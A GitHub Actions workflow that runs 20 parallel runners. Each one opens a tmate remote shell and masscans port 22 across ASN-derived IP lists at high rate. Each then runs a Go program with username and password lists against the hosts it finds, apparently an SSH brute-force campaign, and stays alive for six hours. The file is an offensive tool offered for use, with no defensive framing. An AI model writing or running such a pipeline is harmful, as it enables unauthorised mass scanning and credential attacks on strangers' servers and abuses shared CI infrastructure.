name: CI

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    strategy:
      fail-fast: false
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]

    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: sudo apt update && sudo apt install wget tmate -y

      - name: Start tmate in background
        run: |
          tmate -S /tmp/tmate.sock new-session -d
          tmate -S /tmp/tmate.sock wait tmate-ready
          
          echo "üü¢ TMATE SESSION STARTED"
          echo "SSH: $(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')"
          echo "WEB: $(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')"
          
          while true; do
            sleep 60
            echo "ü§ñ Tmate session still active for instance ${{ matrix.instance }}"
          done &
          TMATE_LOOP_PID=$!
          echo "TMATE_PID=$TMATE_LOOP_PID" >> $GITHUB_ENV

      - name: Print job info
        run: echo "üîπ Running instance ${{ matrix.instance }} of 20"

      - name: Install additional dependencies
        run: |
          sudo apt install -y golang masscan libpcap-dev python3-pip
          pip3 install requests

      - name: Run ASN processor for this instance
        run: |
          echo "üì¶ Processing ASNs for instance ${{ matrix.instance }}..."
          python3 asn.py ${{ matrix.instance }} 20

      - name: Run masscan on instance-specific IPs
        continue-on-error: true
        run: |
          IP_FILE="ipv4_instance_${{ matrix.instance }}.txt"
          
          if [ -f "$IP_FILE" ] && [ -s "$IP_FILE" ]; then
            echo "üîç Scanning $(wc -l < $IP_FILE) IPs from $IP_FILE"
            sudo masscan -iL $IP_FILE -p22 --rate=15000 | awk '/Discovered/{split($4,p,"/"); print $6 ":" p[1]}' > open_${{ matrix.instance }}.txt
            echo "‚úÖ Found $(wc -l < open_${{ matrix.instance }}.txt) open ports"
          else
            echo "‚ö†Ô∏è $IP_FILE is empty or doesn't exist, skipping masscan"
            touch open_${{ matrix.instance }}.txt
          fi

      - name: Run Go program
        continue-on-error: true
        run: |
          echo "üöÄ Starting Go program for instance ${{ matrix.instance }}..."
          
          # Initialize Go module if needed
          if [ ! -f "go.mod" ]; then
            go mod init telee.go
          fi
          
          go mod tidy
          
          # Run Go program with instance-specific open file
          go run telee.go user.txt pass.txt open_${{ matrix.instance }}.txt 20 50 500 &
          SETUP_PID=$!
          
          wait $SETUP_PID || echo "‚ö†Ô∏è Go program exited with error"

      - name: Keep alive for 6 hours
        if: always()
        continue-on-error: true
        run: |
          echo "‚è≥ Instance ${{ matrix.instance }} finished main tasks, keeping tmate alive for 6 hours..."
          echo "Connect via tmate if needed"
          sleep 21600  # 6 hours
